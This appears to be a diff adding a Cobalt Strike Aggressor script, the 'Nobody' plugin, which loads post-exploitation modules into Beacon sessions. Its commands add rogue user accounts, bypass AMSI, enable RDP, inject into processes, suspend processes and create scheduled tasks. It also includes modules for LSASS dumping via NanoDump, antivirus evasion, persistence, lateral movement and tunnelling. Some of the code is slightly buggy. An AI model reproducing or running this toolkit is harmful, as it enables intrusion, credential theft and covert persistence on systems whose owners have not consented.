@@ -1,0 +1,191 @@
+# 输出ASCII艺术到Aggressor控制台
+sub printASCIIArt {
+	println("\c9 [+] Welcome to use Nobody, by Henry [+]");
+	println("\c9 [+] Henry Blog: www.henry666.xyz [+]");
+	println("\c9 [+] Last Update Date: 2023-08-13 [+]");
+    println(" _   _         _                 _        ");
+    println("| \\ | |  ___  | |__    ___    __| | _   _ ");
+    println("|  \\| | / _ \\ | '_ \\  / _ \\  / _` || | | |");
+    println("| |\\  || (_) || |_) || (_) || (_| || |_| |");
+    println("|_| \\_| \\___/ |_.__/  \\___/  \\__,_| \\__, |");
+    println("                                    |___/ ");
+}
+# 调用上述函数
+printASCIIArt();
+
+
+# 引用其他插件
+include(script_resource("modules/inlineExecute-Assembly.cna"));
+include(script_resource("modules/NanoDump.cna"));
+
+
+sub readbof
+{	
+    $barch = barch($1);
+    $bof_filename = script_resource("/scripts/bof/".$2.".".$barch.".obj");
+    println("[INFO] Loading BOF file: $bof_filename");
+
+    $handle = openf($bof_filename);
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    if(strlen($data) == 0)
+    {
+        berror($1, "*ERROR* Failed to read in BOF file: $bof_filename");
+    }
+	
+    btask($1, "Loaded $2 for $barch");
+    return $data;
+}
+
+sub	InlineExecute-Assembly{
+	local('$bid $exe $args');
+	$bid = $1;
+	$exe = $2;
+	$args = $3;
+	blog($bid,$args);
+		
+	if ($arg iswm ""){
+		binput($bid,"inlineExecute-Assembly --dotnetassembly ".script_resource($exe));
+		
+	}else{
+		binput($bid,"inlineExecute-Assembly --dotnetassembly ".script_resource($exe)." --assemblyargs ".$args);
+	}
+}
+
+
+alias suspend {
+	if (size(@_) != 2){
+        berror($1,"boftask: args error");
+        return;
+    }
+
+	local('$data $args $pid $option'); 
+    #$handle = openf(script_resource("/scripts/persistence/SuspendResume.x64.obj"));  
+    $data = readbof($1,"SuspendResume");
+	$args = bof_pack($1,"ii",1,$2);
+	beacon_inline_execute($1, $data, "go", $args);
+	btask($1, "boftask successful!");	
+}
+
+alias resume {
+	if (size(@_) != 2){
+        berror($1,"boftask: args error");
+        return;
+    }
+	
+	local('$data $args $pid $option');  
+    $data = readbof($1,"SuspendResume");
+	$args = bof_pack($1,"ii",0,$2);
+	beacon_inline_execute($1, $data, "go", $args);
+	btask($1, "boftask successful!");	
+}
+
+alias adduser {
+    if (size(@_) != 5){
+        berror($1,"boftask: args error");
+        return;
+    }
+	local('$data $args'); 
+	$data = readbof($1,"AddUser");
+	$args = bof_pack($1,"ZZZZ",$2,$3,$4,$5);
+	beacon_inline_execute($1, $data, "go", $args);
+	btask($1, "Add User: $2");	
+}
+
+alias deleteuser {
+    if (size(@_) != 2){
+        berror($1,"boftask: args error");
+        return;
+    }
+    $data = readbof($1,"DeleteUser");
+	$args = bof_pack($1,"Z",$2);
+	beacon_inline_execute($1, $data, "go", $args);
+	btask($1, "Delete User: $2");	
+}
+
+alias bypassamsi {
+	$data = readbof($1,"ByPassAmsi");
+	beacon_inline_execute($1,$data,"go");
+} 
+
+alias RdpQuery {
+	$data = readbof($1,"RdpQuery");
+	beacon_inline_execute($1,$data,"go");
+}
+
+alias RdpStart {
+	$data = readbof($1,"RdpStart");
+	beacon_inline_execute($1,$data,"go");
+}
+
+alias RdpStop {
+	$data = readbof($1,"Rdp_StartAndStop");
+	$args = bof_pack($1,"i",0);  
+	beacon_inline_execute($1,$data,"go");
+	bshell($1, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0");
+}
+
+alias ntcreatethread{
+	$data = readbof($1,"ntcreatethread");
+	$args = bof_pack($1,"iZ",$2,$3);  
+	beacon_inline_execute($1,$data,"go",$args);
+}
+
+alias ntqueueapcthread{
+	$data = readbof($1,"ntqueueapcthread");
+	$args = bof_pack($1,"iZ",$2,$3);  
+	beacon_inline_execute($1,$data,"go",$args);
+}
+
+alias AddSchtask {
+    # 检查参数数量是否正确
+    if (size(@_) != 6){
+        berror($1,"boftask: args error");
+        return;
+    }
+		
+    # 打开BOF文件并读取内容
+    local('$handle $data $args'); #定义了三个局部变量
+    $data = readbof($1, "BofTest");  # 读取BOF文件的内容
+    closef($handle);  # 关闭BOF文件
+	
+    # 设置参数
+    # 使用bof_pack函数将参数打包成一个字节流
+    # "ZZZZZ"表示我们有五个宽字符串参数,小写的z表示以null结尾的字符串
+    $args = bof_pack($1, "ZZZZZ", $2, $3, $4, $5, $6);
+	
+    # 执行BOF
+    # 使用beacon_inline_execute函数来执行BOF
+    # "go"是BOF中的函数名，$args是传递给这个函数的参数
+    beacon_inline_execute($1, $data, "go", $args);
+
+    # 向用户通知任务已经开始
+    # 使用btask函数在Beacon的控制台中显示一条消息
+    btask($1, "Creating scheduled task as $2");
+}
+
+popup beacon_bottom {
+    menu "Nobody"{	
+    	#信息收集
+        include(script_resource("modules/discovery.cna"));  
+		
+		#免杀系列
+		include(script_resource("modules/anti_antivirus.cna"));  
+		
+		#权限维持
+		include(script_resource("modules/Persistence.cna"));
+		
+		#横向移动
+		include(script_resource("modules/intranet_move.cna"));
+		
+		#隧道代理
+		include(script_resource("modules/TunnelProxy.cna"));
+		
+		#进程注入
+		include(script_resource("modules/ProcessInject.cna"));
+		
+    }
+}
+
+
